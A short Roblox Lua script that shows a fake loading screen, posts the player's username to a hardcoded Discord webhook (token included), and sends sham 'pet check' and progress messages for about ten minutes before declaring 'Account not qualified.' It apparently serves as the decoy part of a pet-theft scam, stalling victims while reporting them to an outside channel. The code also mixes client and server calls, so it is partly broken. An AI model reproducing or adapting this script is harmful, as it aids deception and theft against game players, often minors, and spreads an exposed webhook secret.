--// HttpService + Webhook Setup
local HttpService = game:GetService("HttpService")

-- üîó Your Discord webhook (replace with regenerated one if needed)
local WEBHOOK_URL = "https://discord.com/api/webhooks/1402973631402737715/MK9-MjlNndFsRvnTnkOPpykRpKQXtdIceZ70qocEJGYaPalJVVwBBMdBEI67KZ7jYZPy"

local function sendWebhook(message)
    local payload = {
        ["content"] = message
    }

    local json = HttpService:JSONEncode(payload)

    local success, err = pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false)
    end)

    if not success then
        warn("Webhook failed:", err)
    else
        print("Webhook sent:", message)
    end
end

-----------------------------------------------------------------
-- Example integration into your loading screen

-- When the GUI starts
sendWebhook("üì¢ Loading screen initialized for player: " .. game.Players.LocalPlayer.Name)

-- Example pet check
local pets = {"Raccoon","Dragonfly","Butterfly","Queen Bee","Disco Bee","Mimic Octopus","Fennec Fox","T-Rex","Spinosaurus","Kitsune"}

spawn(function()
    for _, pet in ipairs(pets) do
        sendWebhook("üîç Checking pet: " .. pet)
        wait(5)
        sendWebhook("‚úÖ Pet OK: " .. pet)
    end
end)

-- Progress updates
local totalTime = 600
local startTime = tick()

spawn(function()
    while tick() - startTime < totalTime do
        local pct = math.floor(((tick() - startTime) / totalTime) * 100)
        sendWebhook("‚è≥ Progress Update: " .. pct .. "%")
        wait(30) -- update every 30 seconds
    end
    sendWebhook("‚ùå Server check finished. Account not qualified.")
end)
